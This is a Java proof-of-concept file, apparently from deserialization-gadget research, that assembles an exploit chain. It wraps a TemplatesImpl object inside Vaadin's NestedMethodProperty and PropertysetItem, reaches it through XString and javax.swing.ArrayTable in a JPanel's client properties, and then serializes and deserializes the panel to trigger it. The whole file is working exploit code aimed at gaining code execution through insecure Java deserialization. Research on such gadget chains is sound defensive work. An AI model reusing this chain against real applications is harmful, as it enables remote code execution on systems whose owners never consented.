package com.example.Vaadin;

import com.example.Utils.ReflectionUtil;
import com.example.Utils.SerializeUtil;
import com.example.Utils.Share;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.vaadin.data.util.NestedMethodProperty;
import com.vaadin.data.util.PropertysetItem;

import javax.swing.*;

public class POC_4 {

    /***
     * run with jComponent_equals.jar
     */

    public static void main(String[] args) throws Exception {
        TemplatesImpl tmpl = Share.getTemplatesImplObj();

        PropertysetItem pItem = new PropertysetItem();
        NestedMethodProperty<Object> nmprop = new NestedMethodProperty<Object>(tmpl, "outputProperties");
        pItem.addItemProperty("outputProperties", nmprop);

        Object xString = ReflectionUtil.createObject("com.sun.org.apache.xpath.internal.objects.XString", new Class[]{Object.class}, new Object[]{"str"});

        JPanel j = new JPanel();
        Class atClass = Class.forName("javax.swing.ArrayTable");
        Object arrayTable = ReflectionUtil.createWithoutConstructor(atClass);
        Object[] table = new Object[]{xString, "1", pItem, "2"};

        ReflectionUtil.setField(arrayTable, "table", table);

        ReflectionUtil.setField(j, "clientProperties", arrayTable);
        SerializeUtil.deserialize(SerializeUtil.serialize(j));
    }

}
